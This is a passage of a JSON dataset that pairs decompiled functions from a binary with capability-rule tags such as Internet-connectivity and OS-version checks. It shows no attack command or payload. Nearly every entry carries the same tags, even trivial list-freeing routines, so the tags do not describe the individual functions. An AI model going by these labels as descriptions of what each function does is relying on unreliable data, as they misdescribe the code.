-1;\n            }\n        }\n        if (var_38h != 0) {\n            var_8h[9] = var_8h[9] + 1;\n        }\n    }\ncode_r0x00050fd3:\n    fcn.00036320(var_8h + 10);\n    fcn.000357f0(arg_8h_00);\n    arg_8h_00 = *0x800cdab4;\ncode_r0x000510b0:\n    *0x800cdab4 = arg_8h_00;\n    (**0x80051010)();\n    return 1;\n}\n",
        "token_count": 2015
    },
    "000510d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000510d0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    while (var_8h != 0) {\n        iVar1 = *(var_8h + 8);\n        fcn.000357f0(var_8h);\n        var_8h = iVar1;\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00051110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nbool __cdecl fcn.00051110(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint var_1h;\n    \n    (**0x8005100c)();\n    var_8h = *0x800cdab4;\n    while (var_8h != NULL) {\n        if ((var_8h[3] == arg_ch) && (var_8h[4] == arg_8h)) {\n            var_ch = 6;\n            var_10h = 0x800ce95c;\n            var_14h = var_8h + 5;\n            goto code_r0x00051187;\n        }\n        uVar1 = fcn.00035950(arg_ch);\n        uVar2 = fcn.00035950(var_8h[3]);\n        if (uVar1 < uVar2) {\n            var_8h = *var_8h;\n        }\n        else {\n            var_8h = var_8h[1];\n        }\n    }\n    goto code_r0x0005128f;\ncode_r0x00051187:\n    if (var_ch < 4) goto code_r0x0005118d;\n    if (*var_14h != *var_10h) goto code_r0x00051197;\n    var_ch = var_ch - 4;\n    var_10h = var_10h + 1;\n    var_14h = var_14h + 1;\n    goto code_r0x00051187;\ncode_r0x0005118d:\n    if (var_ch == 0) {\ncode_r0x00051219:\n        var_1ch = 0;\n    }\n    else {\ncode_r0x00051197:\n        var_18h = *var_14h - *var_10h;\n        if (var_18h == 0) {\n            if (var_ch == 1) goto code_r0x00051219;\n            var_18h = *(var_14h + 1) - *(var_10h + 1);\n            if (var_18h == 0) {\n                if (var_ch == 2) goto code_r0x00051219;\n                var_18h = *(var_14h + 2) - *(var_10h + 2);\n                if (var_18h == 0) {\n                    if ((var_ch == 3) || (var_18h = *(var_14h + 3) - *(var_10h + 3),  var_18h == 0))\n                    goto code_r0x00051219;\n                }\n            }\n        }\n        var_1ch = 1;\n        if (var_18h < 1) {\n            var_1ch = -1;\n        }\n    }\n    if (var_1ch == 0) {\n        var_8h = NULL;\n    }\n    else {\n        puVar4 = var_8h;\n        for (iVar3 = 0xb; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *arg_10h = *puVar4;\n            puVar4 = puVar4 + 1;\n            arg_10h = arg_10h + 1;\n        }\n    }\ncode_r0x0005128f:\n    (**0x80051010)();\n    return var_8h != NULL;\n}\n",
        "token_count": 857
    },
    "000512b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000512b0(uint *arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *var_4h;\n    \n    *arg_ch = 0;\n    for (var_4h = arg_8h; var_4h != NULL; var_4h = var_4h[2]) {\n        if (arg_10h != 0) {\n            puVar2 = var_4h;\n            puVar3 = *arg_ch * 0x2c + arg_10h;\n            for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = *puVar2;\n                puVar2 = puVar2 + 1;\n                puVar3 = puVar3 + 1;\n            }\n        }\n        *arg_ch = *arg_ch + 1;\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "00051310": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00051310(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        iVar2 = *(arg_8h + 8);\n        if ((*(iVar2 + 0xe8) != 0) && (*(iVar2 + 0xe8) != -0x7ff6eb20)) {\n            *(iVar2 + 0x168) = *(iVar2 + 0xe8);\n            *(iVar2 + 0xe8) = 0x800914e0;\n        }\n        if (((*(iVar2 + 0x164) != 0) && (cVar1 = fcn.00051790(*(iVar2 + 0xd8), iVar2),  cVar1 != '\\0')) &&\n           (*(iVar2 + 0x164) != -0x7ff6e9b0)) {\n            *(iVar2 + 0x174) = *(iVar2 + 0x164);\n            *(iVar2 + 0x164) = 0x80091650;\n        }\n        fcn.000517f0(*(iVar2 + 8));\n        if (((*0x800b940c != -1) && (arg_ch != 0)) &&\n           ((*0x800ce968 == 0 &&\n            (iVar2 = fcn.000636c0(*(*(iVar2 + 8) + *0x800b940c + 0x40), 0x800919b0, 0x800ce964),  iVar2 == 0)))) {\n            *0x800ce968 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 393
    },
    "00051420": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00051420(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        iVar2 = *(arg_8h + 8);\n        if ((*(iVar2 + 0xe8) != 0) && (*(iVar2 + 0xe8) == -0x7ff6eb20)) {\n            *(iVar2 + 0xe8) = *(iVar2 + 0x168);\n        }\n        if (((*(iVar2 + 0x164) != 0) && (cVar1 = fcn.00051790(*(iVar2 + 0xd8), iVar2),  cVar1 != '\\0')) &&\n           (*(iVar2 + 0x164) == -0x7ff6e9b0)) {\n            *(iVar2 + 0x164) = *(iVar2 + 0x174);\n        }\n        if ((*0x800ce968 != 0) && (iVar2 = fcn.00063b20(0x800ce964),  iVar2 == 0)) {\n            *0x800ce968 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "000514e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.000514e0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    pcVar1 = *(arg_8h + 0x168);\n    var_10h = 0;\n    for (var_8h = 0; var_8h < arg_10h; var_8h = var_8h + 1) {\n        iVar2 = *(*(arg_ch + var_8h * 4) + 8);\n        if (*0x10 != 0x10) {\n            if ((*(iVar2 + 6) & 5) == 0) {\n                var_20h = (**0x80051230)(iVar2, 0);\n            }\n            else {\n                var_20h = *(iVar2 + 0xc);\n            }\n            var_ch = var_20h;\n        }\n        iVar2 = fcn.00048310(arg_8h, 0, 0, 0, var_ch, *(iVar2 + 0x14), 0);\n        if (iVar2 == 0) {\n            *(*(arg_ch + var_8h * 4) + 0x38) = 0;\n        }\n        else {\n            *(*(arg_ch + var_8h * 4) + 0x38) = 1;\n            var_10h = var_10h + 1;\n        }\n    }\n    if (var_10h == arg_10h) {\n        (*pcVar1)(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        for (var_8h = 0; var_8h < arg_10h; var_8h = var_8h + 1) {\n            if (*(*(arg_ch + var_8h * 4) + 0x38) == '\\x01') {\n                (*pcVar1)(arg_8h, arg_ch + var_8h * 4, 1);\n            }\n            else if (*(*(arg_ch + var_8h * 4) + 0x1c + *(*(arg_ch + var_8h * 4) + 0x1e)) != -0x3fffff66) {\n                fcn.00051940(arg_8h, *(arg_ch + var_8h * 4));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 715
    },
    "000517f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000517f0(uint8_t *arg_8h)\n\n{\n    uint var_ch;\n    uint32_t var_8h;\n    uint8_t *var_4h;\n    \n    if (*0x800b940c == 0xffffffff) {\n        var_4h = arg_8h;\n        for (var_8h = 0; var_8h < 0x80; var_8h = var_8h + 1) {\n            if ((((2 < *var_4h) && (*var_4h < 7)) && ((var_4h[1] == 0 || (var_4h[1] == 1)))) && (*(var_4h + 4) == 0)) {\n                *0x800b940c = var_8h;\n                break;\n            }\n            var_4h = var_4h + 1;\n        }\n        if (*0x800b940c == 0xffffffff) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 233
    },
    "00051890": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00051890(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(arg_8h + 0x24);\n    puVar2 = *(arg_8h + 0x2c);\n    puVar4 = arg_ch + 0x10;\n    puVar3 = puVar2;\n    if ((((puVar1 != NULL) && (puVar4 != NULL)) && (puVar3 = *puVar1,  puVar3 == *puVar4)) &&\n       (puVar3 = fcn.000364d0(*(puVar1 + 2), *(arg_ch + 0x14), *puVar4 >> 1),  puVar3 == NULL)) {\n        return 1;\n    }\n    if (((puVar2 != NULL) && (puVar4 != NULL)) &&\n       ((puVar3 = *puVar4,  *puVar2 == puVar3 &&\n        (puVar3 = fcn.000364d0(*(puVar2 + 2), *(arg_ch + 0x14), *puVar4 >> 1),  puVar3 == NULL)))) {\n        return 1;\n    }\n    return puVar3 & 0xffffff00;\n}\n",
        "token_count": 334
    },
    "00051940": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00051940(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 8);\n    if (((*0x800b940c != -1) || (cVar1 = fcn.000517f0(iVar2),  cVar1 != '\\0')) &&\n       ((iVar2 = iVar2 + *0x800b940c,  *(arg_ch + 0x1c + *(arg_ch + 0x1e)) != 0 || (*(iVar2 + 0x3c) != 0)))) {\n        (**(iVar2 + 0x3c))(*(arg_8h + 0xc), arg_ch);\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00051a00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00051a00(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h, int32_t *arg_14h, int32_t *arg_18h)\n\n{\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_14h != NULL) {\n        *arg_14h = arg_8h[2];\n    }\n    if (((arg_18h != NULL) || (arg_10h != NULL)) || (arg_ch != NULL)) {\n        if (*(arg_8h + 7) == '\\0') {\n            var_1ch = arg_8h[2];\n            var_ch = 0;\n            var_10h = 0;\n            var_14h = 0;\n            for (; var_1ch != NULL; var_1ch = *var_1ch) {\n                var_ch = var_ch + var_1ch[5];\n                if (var_1ch[5] == 0) {\n                    var_2ch = 1;\n                }\n                else {\n                    var_2ch = (var_1ch[4] + var_1ch[6] & 0xfff) + 0xfff + var_1ch[5] >> 0xc;\n                }\n                var_10h = var_10h + var_2ch;\n                var_14h = var_14h + 1;\n            }\n            arg_8h[5] = var_14h;\n            arg_8h[1] = var_ch;\n            *arg_8h = var_10h;\n            *(arg_8h + 7) = 1;\n        }\n        if (arg_ch != NULL) {\n            *arg_ch = *arg_8h;\n        }\n        if (arg_10h != NULL) {\n            *arg_10h = arg_8h[5];\n        }\n        if (arg_18h != NULL) {\n            *arg_18h = arg_8h[1];\n        }\n    }\n    return;\n}\n",
        "token_count": 527
    },
    "00051b40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00051b40(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    iVar1 = fcn.00052750(arg_8h, 0, 0x1010102, &var_10h, 6);\n    fcn.00037640(0x800ce848, &var_4h, 1);\n    var_8h = fcn.0003f990(arg_8h, 1);\n    if ((var_8h != 0) && (*(var_8h + 0xc) == 0)) {\n        if (iVar1 == 0) {\n            *(var_8h + 0x1c) = var_10h;\n            *(var_8h + 0x20) = var_ch;\n        }\n        else {\n            *(var_8h + 0x1c) = 0;\n            *(var_8h + 0x20) = 0;\n        }\n    }\n    fcn.00037670(0x800ce848, &var_4h, 1);\n    return iVar1;\n}\n",
        "token_count": 303
    },
    "00051c20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00051c20(void)\n\n{\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_4h;\n    \n    fcn.00034db0(0x80054990, 0x800cdabc, 0x800cdac0);\n    fcn.00078bfa(&var_78h, 0, 0x6c);\n    var_78h._0_1_ = 5;\n    var_78h._1_1_ = 0;\n    var_70h = 0x800926f0;\n    var_6ch = 0x80092710;\n    var_68h = 0x80092080;\n    var_64h = 0x80092d30;\n    var_60h = 0x8007cf40;\n    var_5ch = 0x80092850;\n    var_58h = 0x80092880;\n    var_54h = 0x80092df0;\n    var_50h = 0x80092e00;\n    var_4ch = 0x80092df0;\n    fcn.000789c0(&var_48h, 0x80055618);\n    var_3ch = 0x80092e10;\n    var_38h = 0x80092e20;\n    var_34h = 0x80092f20;\n    (**0x80051030)(&var_4h, 0x800ce96c, &var_78h, 0x6c);\n    var_7ch = var_4h;\n    if (var_4h == 0) {\n        (**0x8005101c)(&var_4h, 0x800ce974, 100, 0xc);\n        if (var_4h == 0) {\n            (**0x80051068)(&var_4h, 0x800ce970, 100);\n            if (var_4h == 0) {\n                var_7ch = fcn.000520c0();\n                if (var_7ch == 0) {\n                    *0x800ce673 = 1;\n                    var_7ch = 0;\n                }\n            }\n            else {\n                var_7ch = var_4h;\n            }\n        }\n        else {\n            var_7ch = var_4h;\n        }\n        if (var_7ch != 0) {\n            if (*0x800ce974 != 0) {\n                (**0x80051058)(*0x800ce974);\n            }\n            if (*0x800ce970 != 0) {\n                (**0x8005106c)(*0x800ce970);\n            }\n            (**0x8005102c)(&var_4h, *0x800ce96c);\n        }\n    }\n    return var_7ch;\n}\n",
        "token_count": 752
    },
    "00051d90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00051d90(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x800ce673 != '\\0') {\n        *0x800ce673 = '\\0';\n        (**0x8005102c)(&var_ch, *0x800ce96c);\n        (**0x80051058)(*0x800ce974);\n        (**0x8005106c)(*0x800ce970);\n        for (var_8h = 0; var_8h < 100; var_8h = var_8h + 1) {\n            iVar1 = fcn.0003df90(var_8h, &var_4h);\n            if ((iVar1 == 0) && (var_4h == 0)) {\n                fcn.0003e010(var_8h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "00051e20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00051e20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    int32_t **var_24h;\n    int32_t var_20h;\n    int32_t **var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_20h = 0;\n    var_1ch = NULL;\n    if (*0x800ce673 == '\\0') {\n        var_ch = -0x3fffffff;\n    }\n    else {\n        var_14h = 1;\n        do {\n            fcn.00037640(0x800ce848, &var_4h, 0);\n            var_10h = fcn.0003f990(arg_8h, 1);\n            if ((var_10h == 0) || (*(var_10h + 0xc) != 0)) {\n                fcn.00037670(0x800ce848, &var_4h, 0);\n                return -0x3ffffff2;\n            }\n            if ((*0x800cdabc != 0) &&\n               ((*(*(var_10h + 4) + 0x54) < *0x800cdabc || (*0x800cdabc + *0x800cdac0 <= *(*(var_10h + 4) + 0x54))))) {\n                fcn.00037670(0x800ce848, &var_4h, 0);\n                return -0x3fffffff;\n            }\n            var_18h = *(var_10h + 4);\n            fcn.00037670(0x800ce848, &var_4h, 0);\n            if ((var_18h == 0) && (var_ch = fcn.00052460(arg_8h),  var_ch != 0)) {\n                return var_ch;\n            }\n            iVar1 = var_14h + -1;\n            bVar2 = var_14h != 0;\n            var_14h = iVar1;\n        } while (bVar2);\n        if (var_18h == 0) {\n            var_ch = -0x3fffff63;\n        }\n        else {\n            (**0x80051024)(&var_8h, &var_1ch, *0x800ce970, arg_ch, arg_10h);\n            if (var_8h == 0) {\n                (**0x8005105c)(&var_8h, &var_20h, *0x800ce974);\n                if (var_8h == 0) {\n                    *(var_20h + 0x38) = 0;\n                    fcn.000344b0(var_20h + 0x3c);\n                    for (var_24h = var_1ch; *var_24h != NULL; var_24h = *var_24h) {\n                    }\n                    if (*(var_20h + 8) == 0) {\n                        *(var_20h + 0xc) = var_24h;\n                    }\n                    *var_24h = *(var_20h + 8);\n                    *(var_20h + 8) = var_1ch;\n                    *(var_20h + 0x1c) = 0;\n                    (**(var_18h + 0x54))(var_18h, &var_20h, 1);\n                    fcn.000345a0(var_20h + 0x3c, 0xffffffff);\n                    var_ch = *(var_20h + 0x1c + *(var_20h + 0x1e));\n                }\n                else {\n                    var_ch = var_8h;\n                    fcn.00037670(0x800ce848, &var_4h, 0);\n                }\n            }\n            else {\n                var_ch = var_8h;\n                fcn.00037670(0x800ce848, &var_4h, 0);\n            }\n            if (var_1ch != NULL) {\n                (**0x800512a4)(var_1ch);\n            }\n            if (var_20h != 0) {\n                fcn.00034540(var_20h + 0x3c);\n                (**0x80051060)(var_20h);\n            }\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 1028
    },
    "000520c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.000520c0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    fcn.0003e100(0x80055628);\n    fcn.0003e100(0x8005563c);\n    for (var_4h = 0; var_4h < 100; var_4h = var_4h + 1) {\n        iVar1 = fcn.0003f990(var_4h, 0);\n        if (iVar1 != 0) {\n            fcn.00052120(var_4h, 1);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 159
    },
    "00052120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00052120(uint arg_8h, int32_t arg_ch)\n\n{\n    int16_t iVar1;\n    uint var_528h;\n    uint var_520h;\n    int16_t *var_51ch;\n    uint var_518h;\n    uint var_31ah;\n    uint32_t var_314h;\n    int32_t var_310h;\n    int32_t var_30ch;\n    uint var_308h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_108h._0_1_ = 0;\n    fcn.00078bfa(&var_108h + 1, 0, 0xff);\n    var_308h._0_2_ = 0;\n    fcn.00078bfa(&var_308h + 2, 0, 0x1fe);\n    var_518h._0_2_ = 0;\n    fcn.00078bfa(&var_518h + 2, 0, 0x1fe);\n    var_314h = 0;\n    fcn.00037640(0x800ce848, &var_4h, 0);\n    var_30ch = fcn.0003f990(arg_8h, 1);\n    if (((var_30ch == 0) || (*(var_30ch + 0x222) == 0x24)) || (*(var_30ch + 0xc) != 0)) {\n        fcn.00037670(0x800ce848, &var_4h, 0);\n        var_310h = 0;\n    }\n    else {\n        fcn.000344b0(var_30ch + 0x14);\n        var_51ch = var_30ch + 0x222;\n        do {\n            iVar1 = *var_51ch;\n            var_51ch = var_51ch + 1;\n        } while (iVar1 != 0);\n        if (var_51ch - (var_30ch + 0x224) >> 1 == 0) {\n            fcn.00037670(0x800ce848, &var_4h, 0);\n            var_310h = -0x3fffffff;\n        }\n        else {\n            *(var_30ch + 0x448) = 0xffffffff;\n            *(var_30ch + 0x42c) = 9;\n            fcn.00037670(0x800ce848, &var_4h, 0);\n            var_310h = fcn.00052460(arg_8h);\n            if ((var_310h == 0) && (arg_ch != 0)) {\n                var_310h = fcn.00052750(arg_8h, 0, 0x1010d, &var_108h, 0x100);\n                if (var_310h != 0) {\n                    return var_310h;\n                }\n                fcn.00037640(0x800ce848, &var_4h, 0);\n                var_30ch = fcn.0003f990(arg_8h, 1);\n                if (var_30ch != 0) {\n                    fcn.00078a08(&var_518h, var_30ch + 0x22, 0x100);\n                    var_31ah._0_2_ = 0;\n                    var_314h = *(var_30ch + 0x222) == 0x7b;\n                }\n                fcn.00037670(0x800ce848, &var_4h, 0);\n                if (var_30ch == 0) {\n                    return var_310h;\n                }\n                if (var_314h == 0) {\n                    fcn.000789c6(&var_308h, 0x100, 0x80051644, &var_108h);\n                }\n                else {\n                    fcn.000789c6(&var_308h, 0x100, 0x80055650, &var_108h, &var_518h);\n                }\n                fcn.00037640(0x800ce848, &var_4h, 1);\n                var_30ch = fcn.0003f990(arg_8h, 1);\n                if (var_30ch != 0) {\n                    fcn.00078a08(var_30ch + 0x222, &var_308h, 0x100);\n                    *(var_30ch + 0x420) = 0;\n                }\n                fcn.00037670(0x800ce848, &var_4h, 1);\n            }\n            var_310h = 0;\n        }\n    }\n    return var_310h;\n}\n",
        "token_count": 1080
    },
    "00052460": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00052460(uint arg_8h)\n\n{\n    int16_t iVar1;\n    uint var_244h;\n    uint *var_240h;\n    int16_t *var_23ch;\n    uint var_238h;\n    int32_t var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    fcn.00037640(0x800ce848, &var_8h, 0);\n    var_10h = fcn.0003f990(arg_8h, 1);\n    if ((var_10h == 0) || (*(var_10h + 0xc) != 0)) {\n        fcn.00037670(0x800ce848, &var_8h, 0);\n        var_230h = -0x3fffffff;\n    }\n    else {\n        var_23ch = var_10h + 0x22;\n        var_240h = &var_220h;\n        do {\n            iVar1 = *var_23ch;\n            *var_240h = iVar1;\n            var_23ch = var_23ch + 1;\n            var_240h = var_240h + 2;\n        } while (iVar1 != 0);\n        var_228h = *(var_10h + 0x14);\n        fcn.00037670(0x800ce848, &var_8h, 0);\n        fcn.000789c0(&var_238h, &var_220h);\n        (**0x80051040)(&var_230h, &var_22ch, &var_ch, &var_224h, 0x800cad00, 2, *0x800ce96c, var_10h, &var_238h, 0, 0);\n        if (var_230h == 0x103) {\n            var_230h = fcn.00041780(var_10h);\n        }\n        if (var_230h == 0) {\n            fcn.00037640(0x800ce848, &var_8h, 1);\n            var_10h = fcn.0003f990(arg_8h, 1);\n            if (var_10h != 0) {\n                *(var_10h + 4) = var_ch;\n                *(var_10h + 0x440) = 0;\n                var_4h = *(var_10h + 0x42c);\n            }\n            fcn.00037670(0x800ce848, &var_8h, 1);\n            if (var_10h == 0) {\n                var_230h = -0x3ffffddb;\n            }\n            else {\n                var_230h = fcn.00052750(arg_8h, 1, 0x1010e, &var_4h, 4);\n                var_230h = fcn.00052750(arg_8h, 0, 0x1010102, &var_1ch, 6);\n                fcn.00037640(0x800ce848, &var_8h, 1);\n                var_10h = fcn.0003f990(arg_8h, 1);\n                if (var_10h == 0) {\n                    var_ch = 0;\n                }\n                else {\n                    if (var_230h == 0) {\n                        *(var_10h + 0x1c) = var_1ch;\n                        *(var_10h + 0x20) = var_18h;\n                    }\n                    else {\n                        *(var_10h + 0x1c) = 0;\n                        *(var_10h + 0x20) = 0;\n                    }\n                    var_ch = *(var_10h + 4);\n                    var_14h = *(var_10h + 0x444);\n                }\n                fcn.00037670(0x800ce848, &var_8h, 1);\n                fcn.00051310(var_ch, var_14h);\n                var_230h = 0;\n            }\n        }\n    }\n    return var_230h;\n}\n",
        "token_count": 1015
    },
    "00052750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
